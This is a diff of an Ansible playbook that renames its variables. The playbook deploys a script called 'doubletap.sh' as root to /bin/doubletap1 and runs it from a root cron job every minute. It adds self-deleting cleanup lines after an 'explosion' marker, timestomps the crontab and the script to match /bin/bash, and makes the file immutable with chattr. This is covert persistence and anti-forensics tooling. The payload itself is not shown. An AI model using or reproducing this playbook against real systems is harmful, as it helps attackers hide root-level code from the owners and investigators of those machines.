@@ -1,44 +1,44 @@
 ---
-- name: Define variables for paths and filenames
-  set_fact:
-    script_path: "/bin/doubletap1"
-    cron_job_name: "DoubleTapScript"
-    cron_job_user: "root"
+#- name: Define variables for paths and filenames
+#  set_fact:
+#    doubletap_sh_cron_script_path: "/bin/doubletap1"
+#    doubletap_sh_cron_job_name: "DoubleTapScript"
+#    doubletap_sh_cron_job_user: "root"
 
 - name: Copy shell script to target system
   copy:
     src: "files/doubletap.sh"
-    dest: "{{ script_path }}"
+    dest: "{{ doubletap_sh_cron_script_path }}"
     owner: root
     group: root
     mode: '0755'
 
 - name: Create cron job for root user to execute script every minute
   cron:
-    name: "{{ cron_job_name }}"
-    user: "{{ cron_job_user }}"
-    job: "{{ script_path }}"
+    name: "{{ doubletap_sh_cron_job_name }}"
+    user: "{{ doubletap_sh_cron_job_user }}"
+    job: "{{ doubletap_sh_cron_script_path }}"
     minute: "*"
     state: present
 
 - name: Add command to delete the script after execution
   lineinfile:
-    path: "{{ script_path }}"
-    line: "rm -f {{ script_path }}"
+    path: "{{ doubletap_sh_cron_script_path }}"
+    line: "rm -f {{ doubletap_sh_cron_script_path }}"
     insertafter: "# Cleanup after explosion"
 
 - name: Add command to remove cron job after execution
   lineinfile:
-    path: "{{ script_path }}"
-    line: "crontab -l | grep -v '{{ script_path }}' | crontab -"
+    path: "{{ doubletap_sh_cron_script_path }}"
+    line: "crontab -l | grep -v '{{ doubletap_sh_cron_script_path }}' | crontab -"
     insertafter: "# Cleanup after explosion"
 
 - name: Timestomp the crontab file
-  command: touch -r /bin/bash /var/spool/cron/crontabs/{{ cron_job_user }}
+  command: touch -r /bin/bash /var/spool/cron/crontabs/{{ doubletap_sh_cron_job_user }}
 
 - name: Timestomp script to match /bin/bash creation time
-  command: touch -r /bin/bash {{ script_path }}
+  command: touch -r /bin/bash {{ doubletap_sh_cron_script_path }}
 
 # TODO check that this should go after timestomp
 - name: Set immutable attribute on script
-  command: chattr +i {{ script_path }}
+  command: chattr +i {{ doubletap_sh_cron_script_path }}
